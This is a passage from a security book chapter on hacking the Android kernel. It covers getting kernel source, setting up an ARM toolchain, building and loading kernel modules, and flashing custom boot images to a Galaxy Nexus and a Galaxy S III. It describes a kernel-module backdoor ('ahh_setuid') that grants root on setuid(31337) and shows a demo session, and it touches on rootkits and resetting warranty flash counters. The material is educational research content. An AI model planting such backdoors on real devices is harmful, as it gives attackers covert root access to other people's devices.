madvise_remove\nAt this point you have successfully checked out a working copy of the kernel\nsource for the target device. This working copy is used throughout the rest of\nthis chapter.\nGetting OEM Kernel Source\nObtaining source code for OEM devices varies from one manufacturer to another.\nOEMs rarely provide access to kernel source via source control (Git, or otherwise).\nInstead, most vendors have an open source portal where you can download\nsource code. For further information on how various OEMs release source code,\nrefer to Appendix B. After you’ve located the specifi c OEM portal, the typical\nprocess is to search for the model number of the target device. This usually\nresults in a downloadable archive containing the kernel source and directions\nc10.indd 11:11:6:AM 02/25/2014 Page 319\n320 Chapter 10 ■ Hacking and Attacking the Kernel\nfor building it. Because the process varies so much from OEM to OEM, this\nchapter doesn’t dive into more detail here. However, the chapter does cover the\nprocess further when it walks you through building a kernel for an OEM device\nin the “Building a Custom Kernel” section later in this chapter.\nSetting Up a Build Environment\nBuilding custom kernel modules or kernel binaries requires a proper build\nenvironment. Such an environment consists of an ARM compiler toolchain\nand various other build tools, such as GNU make. As discussed previously in\nChapter 7, there are several compiler toolchains available. The compiler used for\na particular device is sometimes documented by the OEM in a text fi le included\nwith the kernel source archive. Depending on which toolchain is used, the exact\nprocess of setting up the build environment varies. In this chapter, you use\nvarious versions of the AOSP prebuilt toolchain. Using other toolchains is out\nof scope, so refer to the documentation for those toolchains if you choose to use\nthem. There are only a couple steps to initializing the kernel build environment,\nafter which a working compiler and related tools will be available.\nThe fi rst step for setting up the kernel build environment based on the\nAOSP prebuilt toolchain is the same as covered in Chapter 7. This example\nuses the Android 4.3 version, but the steps are the same regardless of which\nversion is used.\ndev:~/android/src $ . build/envsetup.sh\nincluding device/samsung/maguro/vendorsetup.sh\nincluding sdk/bash_completion/adb.bash\ndev:~/android/src $ lunch full_maguro-userdebug\n============================================\nPLATFORM_VERSION_CODENAME=REL\nPLATFORM_VERSION=4.3\nTARGET_PRODUCT=full_maguro\nTARGET_BUILD_VARIANT=userdebug\nTARGET_BUILD_TYPE=release\nTARGET_BUILD_APPS=\nTARGET_ARCH=arm\nTARGET_ARCH_VARIANT=armv7-a-neon\nTARGET_CPU_VARIANT=cortex-a9\nHOST_ARCH=x86\nHOST_OS=linux\nHOST_OS_EXTRA=Linux-3.2.0-52-generic-x86_64-with-Ubuntu-12.04-precise\nHOST_BUILD_TYPE=release\nBUILD_ID=JWR66Y\nc10.indd 11:11:6:AM 02/25/2014 Page 320\nChapter 10 ■ Hacking and Attacking the Kernel 321\nOUT_DIR=out\n============================================\ndev:~/android/src $\nAt this point, you have a compiler toolchain in your path already. You can\nconfi rm by querying the version of the compiler.\ndev:~/android/src $ arm-eabi-gcc --version\narm-eabi-gcc (GCC) 4.7\nCopyright (C) 2012 Free Software Foundation, Inc.\n[...]\nBuilding a kernel requires an extra step beyond the usual build environment\nsetup steps. Specifi cally, you need to set a few environment variables used by\nthe kernel build system. These inform the kernel about your toolchain.\ndev:~/android/src $ cd kernel/omap/\ndev:~/android/src/kernel/omap $ export CROSS_COMPILE=arm-eabi-\ndev:~/android/src/kernel/omap $ export SUBARCH=arm\ndev:~/android/src/kernel/omap $ export ARCH=arm\ndev:~/android/src/kernel/omap $\nNOTE When building the kernel, take care to use the arm-eabi compiler instead\nof the arm-linux-androideabi compiler. Using the incorrect embedded applica-\ntion binary interface (EABI) causes build failures.\nAfter setting these variables, your environment is fully initialized, and you\nare ready to move toward building your custom modules or kernel. The fi nal\nstep before building kernel components is confi guring the kernel.\nConfi guring the Kernel\nThe Linux kernel contains support for many architectures, hardware components,\nand so on. In order to support building a single image containing everything\nnecessary for any particular combination of settings, the Linux kernel has an\nextensive confi guration subsystem. In fact, it even provides several different\nuser interfaces including Qt-based graphical user interface (GUI) (make xcon-\nfig), text-based menu (make menuconfig), and question and answer interfaces\n(make config). The Android developer website documents the required and\nrecommended confi guration options for the Linux kernel at http://source.\nandroid.com/devices/tech/kernel.html.\nAnother option, which is the most commonly used for building Android ker-\nnels, allows specifying a confi guration template called a defconfi g. The templates\nfor this option are stored in the arch/arm/configs directory in the kernel source.\nc10.indd 11:11:6:AM 02/25/2014 Page 321\n322 Chapter 10 ■ Hacking and Attacking the Kernel\nEach Android device has a corresponding template that is used to build its ker-\nnel. The following example confi gures the kernel to build for the Galaxy Nexus:\ndev:~/android/src/kernel/omap $ make tuna_defconfig\nHOSTCC scripts/basic/fixdep\nHOSTCC scripts/kconfig/conf.o\nSHIPPED scripts/kconfig/zconf.tab.c\nSHIPPED scripts/kconfig/lex.zconf.c\nSHIPPED scripts/kconfig/zconf.hash.c\nHOSTCC scripts/kconfig/zconf.tab.o\nHOSTLD scripts/kconfig/conf\n#\n# configuration written to .config\n#\nIn the preceding excerpt, the kernel build system fi rst builds the dependen-\ncies for processing the confi guration template. Finally, it reads the template and\nwrites out the .config fi le. All the different confi guration methods ultimately\nresult in the creation of this fi le. Although you can edit this fi le directly, it’s\nrecommended that you edit the template instead.\nIn some rare cases, the kernel confi guration in the AOSP tree does not match\nthe actual confi guration used for a device’s live kernel. For example, the Nexus 4’s\nkernel shipped with CONFIG_MODULES disabled but the AOSP mako_defconfig had\nCONFIG_MODULES enabled. If the kernel was compiled with the CONFIG_IKCONFIG\noption, one can extract the confi guration from an uncompressed kernel using\nthe extract-ikconfig using the scripts directory of the Linux kernel. Further,\nthe confi guration is often available in compressed form from /proc/config.gz\non a booted device. Unfortunately, it’s non-trivial to determine the exact kernel\nconfi guration parameters without this confi guration option.\nWith the build environment set up and the kernel confi gured, you are ready\nto build your custom modules or kernel.\nUsing Custom Kernel Modules\nLoadable kernel modules (LKMs) are a convenient way to extend the Linux\nkernel without recompiling the whole thing. For one, modifying the kernel’s\ncode and/or data is a necessity in creating rootkits. Further, executing code in\nkernel-space gives access to privileged interfaces, such as TrustZone. Using a fairly\nsimple LKM, this section introduces some of the facilities the kernel provides.\nYou don’t compile kernel modules for an Android device in the usual way.\nUsually, you compile kernel modules for Linux systems using headers located\nin a version specifi c directory under /lib/modules. The reason for this is that\nc10.indd 11:11:6:AM 02/25/2014 Page 322\nChapter 10 ■ Hacking and Attacking the Kernel 323\nkernel modules have to be compatible with the kernel they are loaded into.\nAndroid devices do not contain such a directory, and no such package is avail-\nable for them. Thankfully, the kernel source fi lls this gap.\nThe previous sections described checking out a copy of the kernel source for\na Galaxy Nexus running Android 4.2.2, setting up the build environment, and\nconfi guring the kernel. Using this environment, you can quickly and easily put\ntogether a simple “Hello World” LKM. To track your changes separately, create\na new branch from the exact version of the source being used by the device:\ndev:~/android/src/kernel/omap $ git checkout 9f818de -b ahh_modules\nChecking out files: 100% (37662/37662), done.\nSwitched to a new branch 'ahh_modules'\nWith the branch created, extract the kernel modules included with this chap-\nter’s accompanying materials.\ndev:~/android/src/kernel/omap $ tar zxf ~/ahh/chapter10/ahh_modules.tgz\ndev:~/android/src/kernel/omap $\nThis creates two new directories, each containing one module, in the\ndrivers directory in the Linux kernel source. The following is an excerpt from\nthe source to the “Hello World” module:\nint init_module(void)\n{\nprintk(KERN_INFO \"%s: HELLO WORLD!@#!@#\\n\", __this_module.name);\n/* force an error so we don't stay loaded */\nreturn -1;\n}\nSimilar to building on other Linux distributions, it’s not necessary to build\nthe entire kernel prior to compiling modules. Only a few things are needed to\nget the kernel build environment ready to build modules. The following excerpt\nshows the necessary commands:\ndev:~/android/src/kernel/omap $ make prepare modules_prepare\nscripts/kconfig/conf --silentoldconfig Kconfig\nCHK include/linux/version.h\nUPD include/linux/version.h\n[...]\nHOSTCC scripts/kallsyms\nThis command is the extent of what is strictly required. It builds the neces-\nsary scripts and header fi les needed for building modules.\nc10.indd 11:11:6:AM 02/25/2014 Page 323\n324 Chapter 10 ■ Hacking and Attacking the Kernel\nUsing the command line from within the “Hello World” LKM’s source, com-\npile the module. Here’s the output from the commands:\ndev:~/android/src/kernel/omap $ make ARCH=arm CONFIG_AHH_HELLOWORLD=m \\\nM=drivers/ahh_helloworld\nWARNING: Symbol version dump ~/android/src/kernel/omap/Module.symvers\nis missing; modules will have no dependencies and modversions.\n[...]\nLD [M] drivers/ahh_helloworld/ahh_helloworld_mod.ko\nA warning was printed during the build, but the build completed successfully.\nIf you don’t have a need for dependencies or module versioning then there’s\nnothing to fi x. If you simply don’t like seeing nasty warnings or you need those\nfacilities, building the kernel’s modules fi xes the issue:\ndev:~/android/src/kernel/omap $ make modules\nCHK include/linux/version.h\nCHK include/generated/utsrelease.h\n[...]\nLD [M] drivers/scsi/scsi_wait_scan.ko\nWith the “Hello World” module compiled, you are ready to push it to the\ndevice and insert it into the running kernel:\ndev:~/android/src/kernel/omap $ adb push \\\ndrivers/ahh_helloworld/ahh_helloworld_mod.ko /data/local/tmp\n788 KB/s (32557 bytes in 0.040s)\ndev:~/android/src/kernel/omap $ adb shell\nshell@android:/data/local/tmp $ su\nroot@android:/data/local/tmp # insmod ahh_helloworld_mod.ko\nPush the module and open a shell using ADB. Using root privileges, insert\nthe module using the insmod command. The kernel starts to load the module\nand executes the init_module function. Inspecting the kernel ring buffer using\nthe dmesg command, you see the following.\nroot@android:/data/local/tmp # dmesg | ./busybox tail -1\n<6>[74062.026855] ahh_helloworld_mod: HELLO WORLD!@#!@#\nroot@android:/data/local/tmp #\nThe second included kernel module is a more advanced example kernel\nmodule, called ahh_setuid. Using a simple instrumentation technique, this\nmodule creates a backdoor that gives root privileges to any program that calls\nthe setuid system call with the desired user ID of 31337. The process for build-\ning and installing it is the same as before:\ndev:~/android/src/kernel/omap $ make ARCH=arm CONFIG_AHH_SETUID=m \\\nM=drivers/ahh_setuid\nc10.indd 11:11:6:AM 02/25/2014 Page 324\nChapter 10 ■ Hacking and Attacking the Kernel 325\n[...]\nLD [M] drivers/ahh_setuid/ahh_setuid_mod.ko\ndev:~/android/src/kernel/omap $ adb push drivers/ahh_setuid/ahh_setuid_mod.ko \\\n/data/local/tmp\n648 KB/s (26105 bytes in 0.039s)\ndev:~/android/src/kernel/omap $ adb shell\nshell@android:/data/local/tmp $ su\nroot@android:/data/local/tmp # insmod ahh_setuid_mod.ko\ninsmod: init_module 'ahh_setuid_mod.ko' failed (Operation not permitted)\nshell@android:/data/local/tmp # exit\nshell@android:/data/local/tmp $ id\nuid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),...\nshell@android:/data/local/tmp $ ./setuid 31337\nshell@android:/data/local/tmp # id\nuid=0(root) gid=0(root)\nOne thing that stands out in the preceding excerpt is the error message printed\nwhen you run insmod. The kernel prints this error because the init_module\nfunction returned -1. This causes the kernel to automatically unload the mod-\nule, alleviating the need to unload the module before inserting it again. After\nrelinquishing root privileges, passing 31337 to the setuid system call yields\nroot again.\nEven though loadable kernel modules are a convenient way to extend a run-\nning kernel, or perhaps because of this fact, some Android devices are not\ncompiled with loadable module support. You can determine if a running kernel\nsupports loadable modules by checking for the modules entry in the proc fi le\nsystem or looking for the value of CONFIG_MODULES in the kernel confi guration.\nDuring the release of Android 4.3, Google disabled loadable module support\nfor all supported Nexus devices.\nBuilding a Custom Kernel\nAlthough the Linux kernel contains myriad facilities for confi guring and extend-\ning its functionality at runtime, some changes simply require building a custom\nkernel. For example, some confi guration changes, such as enabling debugging\nfacilities, cause entire fi les or functions to be included at compile time. This chapter\nhas already explained obtaining source code, setting up a build environment,\nand confi guring the kernel. This section walks you through the remainder of\nthe process building the kernel source code for the AOSP-based Galaxy Nexus\nand the Galaxy S III manufactured by Samsung.\nAOSP-Supported Devices\nEarlier in this chapter, you obtained the proper source code, set up the build\nenvironment, and confi gured the kernel for your Galaxy Nexus running\nc10.indd 11:11:6:AM 02/25/2014 Page 325\n326 Chapter 10 ■ Hacking and Attacking the Kernel\nAndroid 4.2.2. There’s only one step in the process of building a custom kernel.\nTo complete the process, you compile the kernel using the default make target,\nas shown here:\ndev:~/android/src/kernel/omap $ make\n[...]\nKernel: arch/arm/boot/zImage is ready\ndev:~/android/src/kernel/omap $\nWhen a build completes successfully, the kernel build system writes the\ncompiled kernel image to the zImage fi le in the arch/arm/boot directory. If\nerrors occur, they must be resolved before the build will complete successfully.\nOnce the build is successful, booting the newly created kernel is covered in the\n“Creating a Boot Image” and “Booting a Custom Kernel” sections that follow.\nNOTE The process of building a custom kernel should be identical for all AOSP-\nsupported devices, including all devices in the Nexus family.\nAn OEM Device\nBuilding a kernel for an OEM device is very similar to building one for an AOSP\ndevice. This makes a lot of sense when remembering that OEMs make their\nfi rmware builds from their modifi ed version of the AOSP code. As with any\nOEM device–related tasks, the specifi cs vary from one vendor to the next. This\nsection explains how to build and test a custom kernel for the Sprint version\nof the Samsung Galaxy S III (SPH-L710). The goal is to produce a kernel that is\ncompatible with the device’s existing kernel.\nThe fi rst thing you need to determine when building the kernel is which\nsource to use. Exactly how you accomplish this varies from one device to the\nnext. If you are lucky, the kernel version string references a commit hash from\none of the AOSP Git repositories. This is especially true for older devices, which\nused kernels built and supplied by Google. The Motorola Droid that’s used in\none of the “Case Studies” sub-sections later in this chapter is one such device.\nCheck the device’s kernel version using this command:\nshell@android:/ $ cat /proc/version\nLinux version 3.0.31-1130792 (se.infra@SEP-132) (gcc version 4.6.x-\ngoogle 20120106 (prerelease) (GCC) ) #2 SMP PREEMPT Mon Apr 15 19:05:47\nKST 2013\nUnfortunately, the Galaxy S III does not include a commit hash in its version\nstring. As such, you need to take an alternative approach.\nc10.indd 11:11:6:AM 02/25/2014 Page 326\nChapter 10 ■ Hacking and Attacking the Kernel 327\nAnother approach involves obtaining the OEM-provided version of the kernel\nsource tree. Start by inspecting the build fi ngerprint for the device:\nshell@android:/ $ getprop ro.build.fingerprint\nsamsung/d2spr/d2spr:4.1.2/JZO54K/L710VPBMD4:user/release-keys\nThe Compatibility Defi nition Document (CDD) explains that this system\nproperty is composed of the following fi elds. The following text was slightly\nmodifi ed for formatting.\n$(BRAND)/$(PRODUCT)/$(DEVICE):$(RELEASE)/$(ID)/$(INCREMENTAL):$(TYPE)/\n$(TAGS)\nThe specifi c fi elds of interest are in the second grouping. They are the RELEASE,\nID, and INCREMENTAL values.\nThe fi rst fi eld you need to pay attention to is the INCREMENTAL fi eld. Many\nvendors, including Samsung, use the INCREMENTAL fi eld as their own custom\nversion number. From the output you know Samsung identifi es this fi rmware\nas version L710VPBMD4.\nArmed with the device model number (SPH-L710 according to ro.product.\nmodel) for this device and Samsung’s version identifi er, you are able to search\nSamsung’s open source portal. When you search for the model number, you see\na download with the version MD4 in the results. Download the corresponding\narchive and extract the Kernel.tar.gz and README_Kernel.txt fi les:\ndev:~/sph-l710 $ unzip SPH-L710_NA_JB_Opensource.zip Kernel.tar.gz \\\nREADME_Kernel.txt\nArchive: SPH-L710_NA_JB_Opensource.zip\ninflating: Kernel.tar.gz\ninflating: README_Kernel.txt\ndev:~/sph-l710 $ mkdir kernel\ndev:~/sph-l710 $ tar zxf Kernel.tar.gz -C kernel\n[...]\nWith the relevant fi les extracted, the next step is to read the README_Kernel.\ntxt fi le. This fi le contains instructions, including which toolchain and build\nconfi guration to use. The README_Kernel.txt fi le included in the archive says\nto use the arm-eabi-4.4.3 toolchain along with the m2_spr_defconfig build\nconfi guration. Something is fi shy, though. The kernel version string that the\ntoolchain used to build the running kernel identifi ed itself as “gcc version\n4.6.x-google 20120106 (prerelease).” The kernel version string is more authorita-\ntive than README_Kernel.txt so keep this in mind.\nThe next step in the process is to set up the build environment. The README_\nKernel.txt fi le suggests that using the toolchain from AOSP should work. To\nc10.indd 11:11:6:AM 02/25/2014 Page 327\n328 Chapter 10 ■ Hacking and Attacking the Kernel\nbe safe and avoid potential pitfalls, try to match the build environment of the\ndevice as much as possible. Here is where the RELEASE and ID fi elds from the\nbuild fi ngerprint become relevant. From the output, these are set to 4.1.2 and\nJZO54K for the target device. To fi nd out exactly which tag to use, consult the\n“Codenames, Tags, and Build Numbers” page in the Android documentation at\nhttp://source.android.com/source/build-numbers.html. Looking up JZO54K,\nyou see that it corresponds to the android-4.1.2_r1 tag. Using this, initialize\nthe AOSP repository accordingly as follows:\ndev:~/sph-l710 $ mkdir aosp && cd $_\ndev:~/sph-l710/aosp $ repo init -u \\\nhttps://android.googlesource.com/a/platform/manifest -b android-4.1.2_r1\ndev:~/sph-l710/aosp $ repo sync\n[...]\nAfter checking out the correct AOSP revision, you are almost ready to start\nbuilding the kernel. But fi rst, you need to fi nish re-initializing the kernel build\nenvironment, as shown here:\ndev:~/sph-l710/aosp $ . build/envsetup.sh\n[...]\ndev:~/sph-l710/aosp $ lunch full-user\n============================================\nPLATFORM_VERSION_CODENAME=REL\nPLATFORM_VERSION=4.1.2\nTARGET_PRODUCT=full\nTARGET_BUILD_VARIANT=user\nTARGET_BUILD_TYPE=release\nTARGET_BUILD_APPS=\nTARGET_ARCH=arm\nTARGET_ARCH_VARIANT=armv7-a\nHOST_ARCH=x86\nHOST_OS=linux\nHOST_OS_EXTRA=Linux-3.2.0-54-generic-x86_64-with-Ubuntu-12.04-precise\nHOST_BUILD_TYPE=release\nBUILD_ID=JZO54K\nOUT_DIR=out\n============================================\ndev:~/sph-l710/aosp $ export ARCH=arm\ndev:~/sph-l710/aosp $ export SUBARCH=arm\ndev:~/sph-l710/aosp $ export CROSS_COMPILE=arm-eabi-\nThis brings the AOSP prebuilt toolchain into your environment. Unlike your\nGalaxy Nexus kernel build, you use the full-user build confi guration. Also,\nc10.indd 11:11:6:AM 02/25/2014 Page 328\nChapter 10 ■ Hacking and Attacking the Kernel 329\nyou set the CROSS_COMPILE environment variable instead of editing the Makefile\n(as the README_Kernel.txt instructs). Query the compiler’s version:\ndev:~/sph-l710/aosp $ arm-eabi-gcc --version\narm-eabi-gcc (GCC) 4.6.x-google 20120106 (prerelease)\n[...]\nExcellent! This exactly matches the compiler version from the running ker-\nnel’s version string! Using this toolchain should theoretically generate a nearly\nidentical kernel. It should, at the very least, be compatible.\nUsing further information from the README_Kernel.txt fi le, proceed to con-\nfi gure and build the kernel:\ndev:~/sph-l710/aosp $ cd ~/sph-l710/kernel\ndev:~/sph-l710/kernel $ make m2_spr_defconfig\n[...]\n#\n# configuration written to .config\n#\ndev:~/sph-l710/kernel $ make\n[...]\nKernel: arch/arm/boot/zImage is ready\nIf everything goes according to plan, the kernel builds successfully and the\ncompressed image is available as arch/arm/boot/zImage. In information secu-\nrity, things rarely go according to plan. While building this kernel, you might\nrun into one particular issue. Specifi cally, you might be met with the following\nerror message.\nLZO arch/arm/boot/compressed/piggy.lzo\n/bin/sh: 1: lzop: not found\nmake[2]: *** [arch/arm/boot/compressed/piggy.lzo] Error 1\nmake[1]: *** [arch/arm/boot/compressed/vmlinux] Error 2\nmake: *** [zImage] Error 2\nThis occurs when the build system is missing the lzop command. Samsung\ncompresses its kernel with the LZO algorithm, which prefers speed over minimal\nstorage space usage. After installing this dependency, rerun the make command\nand the build should complete successfully.\nCreating a Boot Image\nRecall that Android devices typically have two different modes where they\nboot a Linux kernel. The fi rst mode is the normal boot process, which uses the\nboot partition. The second mode is during the recovery process, which uses\nc10.indd 11:11:6:AM 02/25/2014 Page 329\n330 Chapter 10 ■ Hacking and Attacking the Kernel\nthe recovery partition. The underlying fi le structure for both of these parti-\ntions is identical. They both contain a short header, a compressed kernel, and\nan initial ramdisk (initrd) image. Usually the same kernel is used for both, but\nnot always. In order to replace the kernel used in these modes, it is necessary to\nre-create the partition image to include your new kernel. This section focuses\non the boot.img.\nCreating a boot image with your freshly built custom kernel is easiest when\nbasing it off an existing boot image. The fi rst step is obtaining such an image.\nAlthough using a boot image from a stock fi rmware image usually works, using\nthe image directly from the device is safer. Because a device’s kernel might\nhave been updated by an OTA update or otherwise, using an image obtained\ndirectly from the device is sure to start with something that is working. To\nobtain the image from the device, follow the steps outlined in the “Extracting\nfrom Devices” section earlier in this chapter.\nThe next step is to extract the obtained boot image. Follow the steps outlined\nin the “Getting the Kernel from a Boot Image” section. This leaves you with the\nbootimg.cfg, zImage, and initrd.img fi les.\nNOTE Although the unpacking and repacking process is usually done on the\nmachine used for running ADB, it could just as well be performed entirely on a rooted\ndevice.\nSimilar to how you extract a kernel, you use the abootimg tool to create the\nboot image. For this purpose, abootimg supports two use cases: updating and\ncreating. Updating is useful when the original boot image need not be saved\nand is accomplished as follows.\ndev:~/android/src/kernel/omap/staging $ abootimg -u cur-boot.img \\\n-k ../arch/arm/boot/zImage\nreading kernel from ../arch/arm/boot/zImage\nWriting Boot Image cur-boot.img\nThis excerpt shows how you can use abootimg’s convenient -u option to update\nthe boot image, replacing the kernel with your own. Alternatively, you can use\nthe --create option to assemble a boot image from a kernel, initrd, and an\noptional secondary stage. In cases where the kernel or initrd have grown, the\nabootimg command produces an error message like the following:\ndev:~/android/src/kernel/omap/staging $ abootimg --create new-boot.img -f \\\nbootimg.cfg -k bigger-zImage -r initrd.img\nreading config file bootimg.cfg\nreading kernel from bigger-zImage\nreading ramdisk from initrd.img\nnew-boot.img: updated is too big for the Boot Image (4534272 vs 4505600 bytes)\nc10.indd 11:11:6:AM 02/25/2014 Page 330\nChapter 10 ■ Hacking and Attacking the Kernel 331\nTo overcome this error, simply pass the -c option (as shown in the following\nexcerpt) or update the bootsize parameter within the bootimg.cfg used by\nabootimg.\ndev:~/android/src/kernel/omap/staging $ abootimg --create new-boot.img -f \\\nbootimg.cfg -k bigger-zImage -r initrd.img -c \"bootsize=4534272\"\nreading config file bootimg.cfg\nreading kernel from bigger-zImage\nreading ramdisk from initrd.img\nWriting Boot Image new-boot.img\nFor the Samsung Galaxy S III, the process is nearly identical. As was done for\nwith the Nexus device, obtain the existing boot image from the device or a factory\nimage. This time, download the KIES_HOME_L710VPBMD4_L710SPRBMD4_1130792_\nREV03_user_low_ship.tar.md5 factory image by searching the SamFirmware\nwebsite for the device’s model number. This should be the same image you used\nto upgrade your device. Extract the fi rmware image and boot image inside as\nshown in the following excerpt:\ndev:~/sgs3-md4 $ mkdir stock\ndev:~/sgs3-md4 $ tar xf KIES*MD4*.tar.md5 -C stock\ndev:~/sgs3-md4 $ mkdir boot && cd $_\ndev:~/sgs3-md4/boot $ abootimg -x ../stock/boot.img\nwriting boot image config in bootimg.cfg\nextracting kernel in zImage\nextracting ramdisk in initrd.img\nWith the stock boot.img extracted, you have everything you need to build a\ncustom boot image. Use abootimg to do:\ndev:~/sgs3-md4/boot $ mkdir ../staging\ndev:~/sgs3-md4/boot $ abootimg --create ../staging/boot.img -f bootimg.cfg \\\n-k ~/sph-l710/kernel/arch/arm/boot/zImage -r initrd.img\nreading config file bootimg.cfg\nreading kernel from /home/dev/sph-l710/kernel/arch/arm/boot/zImage\nreading ramdisk from initrd.img\nWriting Boot Image ../staging/boot.img\nBooting a Custom Kernel\nAfter a successful build, the kernel build system writes the kernel image to arch/\narm/boot/zImage. You can boot this newly built kernel on a device in several\nways. As with many other things on Android, which methods apply depend\non the particular device. This section covers four methods: two that use the\nfastboot protocol, one that uses an OEM proprietary download protocol, and\none that is done on the device itself.\nc10.indd 11:11:6:AM 02/25/2014 Page 331\n332 Chapter 10 ■ Hacking and Attacking the Kernel\nUsing Fastboot\nBooting this newly built kernel using fastboot, for example on an AOSP-\nsupported device, can be accomplished one of two ways. You can either boot\nthe boot.img straight away or write it to the boot partition for the device. The\nfi rst method is ideal because recovering from failure is as easy as rebooting\nthe device. However, this method may not be supported by all devices. The\nsecond method is more persistent and is preferred when the device may need\nto be rebooted many times. Unfortunately, both methods require unlocking the\ndevice’s boot loader. In either case, you must reboot the device into fastboot\nmode, as shown here:\ndev:~/android/src/kernel/omap/staging $ adb reboot bootloader\nAfter this command is executed, the reference device reboots into the boot\nloader and enables fastboot mode by default. In this mode, the device displays\nan opened Bugdroid and the text “FASTBOOT MODE” on the screen.\nWARNING Unlocking the boot loader often void’s a device’s warranty. Take\nextreme care to do everything correctly because a misstep could render your device\npermanently unusable.\nThe fi rst method, which uses the boot command from the fastboot utility,\nallows directly booting the newly created boot.img. This method is nearly\nidentical to how you booted a custom recovery in Chapter 3. The only differ-\nence is that you’re booting a boot.img instead of a recovery.img. Here are the\nrelevant commands:\ndev:~/android/src/kernel/omap/staging $ fastboot boot new-boot.img\n[.. device boots ..]\ndev:~/android/src/kernel/omap/staging $ adb wait-for-device shell cat \\\n/proc/version\nLinux version 3.0.31-g9f818de-dirty (jdrake@dev) (gcc version 4.7 (GCC) )...\nAfter rebooting to the boot loader and using fastboot boot to boot the boot.\nimg, you shell in and confi rm that the modifi ed kernel is running.\nThe second, more permanent method uses fastboot flash to write the\nnewly created boot.img to the device’s boot partition. Here are the commands\nto carry out this method:\ndev:0:~/android/src/kernel/omap/staging $ fastboot flash boot new-boot.img\nboot new-boot.img\nsending 'boot' (4428 KB)...\nOKAY [ 1.679s]\nwriting 'boot'...\nOKAY [ 1.121s]\nfinished. total time: 2.800s\ndev:0:~/android/src/kernel/omap/staging $ fastboot reboot\nrebooting...\nc10.indd 11:11:6:AM 02/25/2014 Page 332\nChapter 10 ■ Hacking and Attacking the Kernel 333\nfinished. total time: 0.006s\ndev:0:~/android/src/kernel/omap/staging $ adb wait-for-device shell\nshell@android:/ $ cat /proc/version\nLinux version 3.0.31-g9f818de-dirty (jdrake@dev) (gcc version 4.7 (GCC) )...\nAfter executing the fastboot flash boot command, you reboot the device\nand shell in to confi rm that the modifi ed kernel is running.\nUsing OEM Flashing Tools\nThe process for fl ashing the boot partition of an OEM device varies from one\ndevice to the next. Unfortunately, this is not always possible. For example, some\nOEM devices have a locked boot loader that cannot be unlocked. Other devices\nmight prevent fl ashing an unsigned boot.img at all. This section explains how\nto fl ash the custom-built kernel for the Samsung Galaxy S III.\nNOTE Using a rooted device, it may be possible to work around signing issues with\nkexec. The kexec program boots a Linux kernel from an already-booted system.\nDetailed use of kexec is outside the scope of this chapter.\nThough the Sprint Samsung Galaxy S III cryptographically validates the boot.\nimg, it does not prevent you from fl ashing or booting an unsigned copy. Rather,\nit only increases an internal counter that tracks how many times a custom image\nwas fl ashed. This counter is displayed onscreen when the device is booted into\ndownload mode, as you’ll see later in this section. Samsung uses this counter\nto track whether a device’s warranty was voided due to the use of unoffi cial\ncode. Knowing that fl ashing an unsigned boot.img will not brick your device,\nyou are ready to actually put it on the device and boot it.\nNOTE Chainfi re, who focuses on Samsung, created a tool called TriangleAway\nthat is able to reset the fl ash counter of most devices. This is only one of many of his\ntools, including the venerable SuperSU. Chainfi re’s projects can be found at http://\nchainfire.eu/\nAs with many OEM devices, the Samsung Galaxy S III does not support\nfastboot. However, it does support a comparable proprietary download mode.\nThis example uses this mode, along with the corresponding proprietary fl ashing\ntool, to write the newly created boot.img.\nThe offi cial tool for fl ashing various parts of Samsung devices is the Odin util-\nity. In fact, Odin is reportedly the utility that Samsung employees use internally.\nThe general process is much like that of a Nexus device. First put the device\ninto download mode, as shown here:\ndev:~/sgs3-md4/boot $ cd ../staging\ndev:~/sgs3-md4/staging $ adb reboot bootloader\nc10.indd 11:11:6:AM 02/25/2014 Page 333\n334 Chapter 10 ■ Hacking and Attacking the Kernel\nThe device is now ready to accept the image, but there’s one problem: Odin\ndoesn’t take a raw boot image as input. Instead, as with the stock fi rmware\nimage, it uses a format called .tar.md5. The specifi c details of how this fi le is\ngenerated are important for getting Odin to accept the boot.img. You must add\nthe MD5 to the image, which serves as an integrity-checking mechanism (MD5)\nand allows packaging multiple partition images into one fi le. You package the\nfreshly built boot image (including your custom kernel) as so:\ndev:~/sgs3-md4/staging $ tar -H ustar -c boot.img > boot.tar\ndev:~/sgs3-md4/staging $ ( cat boot.tar; md5sum -t boot.tar ) > boot.tar.md5\nNow you have everything you need prepared, but you still have one problem\nto deal with. Odin is only available for Windows; it can’t be run on the Ubuntu\ndevelopment machine being used for this example. An open source program\ncalled Heimdall aims to solve this issue, but it doesn’t work with the SPH-L710.\nUnfortunately, you need to copy the boot.tar.md5 fi le to a Windows machine and\nrun Odin with Administrator privileges. When Odin appears, check the check-\nbox next to the PDA button and then click it. Navigate to where your boot.tar.\nmd5 fi le is on the fi le system and open it. Boot the device into download mode by\nholding the Volume Down and Home buttons while pressing the power button or\nusing the adb reboot bootloader command. After the warning appears, press\nthe Volume Up button to continue. The download mode screen appears showing\nsome status including your “Custom Binary Download” count. After that, plug\nthe device into the Windows computer. At this point Odin looks like Figure 10-3.\nFigure 10-3: Odin ready to flash boot\nc10.indd 11:11:6:AM 02/25/2014 Page 334\nChapter 10 ■ Hacking and Attacking the Kernel 335\nNow click the Start button to fl ash the boot partition. If the Auto Reboot option\nis selected, the device reboots automatically after fl ashing completes. Once the\nreboot completes, you can safely reconnect the device to your development\nmachine and confi rm success as shown:\nshell@android:/ $ cat /proc/version\nLinux version 3.0.31 (jdrake@dev) (gcc version 4.6.x-google 20120106 ...\nWriting the Partition Directly\nBesides using fastboot or OEM fl ash tools, you can write the custom boot image\ndirectly to the boot partition. The main advantage to this approach is that you\ncan use it without rebooting the device. For example, Chainfi re’s MobileOdin\napp uses this method to fl ash parts of the device entirely without the use of\nanother computer. Overall, this approach is faster and easier because it requires\nfewer steps and mostly avoids the need for extra tools.\nHowever, this approach has additional requirements and potential problem\nareas that you must consider. First of all, this approach is only possible on a\nrooted device. Without root access, you simply will not be able to write to the\nblock device for the boot partition. Secondly, you must consider whether there\nare any boot-level restrictions that would prevent this method from succeeding.\nIf the boot loader prevents booting unsigned boot images, you could end up\nbricking the device. Further, you must accurately determine which block device\nto use. This is sometimes diffi cult and has potentially dire consequences if you\nare incorrect. If you write to the wrong partition, you might brick the device to\nthe point of being unrecoverable.\nIn the case of the two case study devices though, the boot loader does not\nneed to be unlocked and signature enforcement does not prevent this method.\nThough the Samsung Galaxy S III will detect a signature failure and increment\nthe custom fl ash counter, it doesn’t prevent booting the unsigned boot image.\nThe Galaxy Nexus simply doesn’t verify the signature at all. Exactly how you\ndo this on each device varies, as shown in the following excerpts.\nc10.indd 11:11:6:AM 02/25/2014 Page 335\n336 